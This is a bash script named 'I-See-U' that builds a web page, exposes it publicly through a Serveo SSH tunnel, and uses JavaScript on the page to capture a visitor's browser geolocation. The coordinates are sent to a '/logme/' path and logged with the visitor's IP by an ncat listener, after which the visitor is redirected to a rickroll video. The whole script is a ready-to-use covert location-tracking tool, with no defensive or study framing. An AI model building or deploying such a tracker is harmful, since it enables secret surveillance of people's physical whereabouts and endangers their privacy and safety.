#!/bin/bash

PORT=${1:-8080}
WEB_DIR=~/webpage
LOG_DIR=~/iseeu/logs
TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S')
LOG_FILE="$LOG_DIR/log_$TIMESTAMP.txt"

clear
echo "[*] Starting I-See-U on port $PORT..."

# Setup web directory
mkdir -p "$WEB_DIR"
rm -f "$WEB_DIR/index.html"

# Setup log directory
mkdir -p "$LOG_DIR"
touch "$LOG_FILE"

# Create geolocation payload
cat <<EOF > "$WEB_DIR/index.html"
<!DOCTYPE html>
<html>
<head>
  <title>I See You</title>
</head>
<body>
  <script>
    function sendLocation(position) {
      var coords = position.coords.latitude + "," + position.coords.longitude;
      fetch("/logme/" + coords);
      window.location = "https://shattereddisk.github.io/rickroll/rickroll.mp4";
    }
    navigator.geolocation.getCurrentPosition(sendLocation);
  </script>
  <h1>Loading...</h1>
</body>
</html>
EOF

# Start local Python server
cd "$WEB_DIR" || exit 1
python3 -m http.server "$PORT" > /dev/null 2>&1 &
SERVER_PID=$!
echo "[+] Local server started (PID $SERVER_PID)"

# Start Serveo tunnel
echo "[*] Starting Serveo tunnel..."
ssh -o StrictHostKeyChecking=no -R 80:localhost:$PORT serveo.net > serveo_url.txt 2>&1 &
SSH_PID=$!

sleep 5
URL=$(grep -oE 'https://[a-z0-9]+\.serveo\.net' serveo_url.txt | head -n 1)

if [[ -n "$URL" ]]; then
  echo "[✓] Public URL: $URL"
else
  echo "[✗] Failed to get Serveo URL"
  kill "$SERVER_PID" "$SSH_PID" 2>/dev/null
  exit 1
fi

# Start logging server
echo "[*] Logging to $LOG_FILE"
ncat -k -l "$PORT" --ssl --keep-open --exec "/bin/bash -c '
  while read line; do
    if [[ \$line == *\"/logme/\"* ]]; then
      gps=\$(echo \$line | cut -d\" \" -f2 | cut -d/ -f3)
      echo \"IP: \$REMOTE_HOST | GPS: \$gps | Time: \$(date)\" >> \"$LOG_FILE\"
    fi
  done
'" &

trap 'echo "[*] Cleaning up..."; kill $SERVER_PID $SSH_PID; echo "[*] Done."' EXIT
echo "[*] Press Ctrl+C to stop."
wait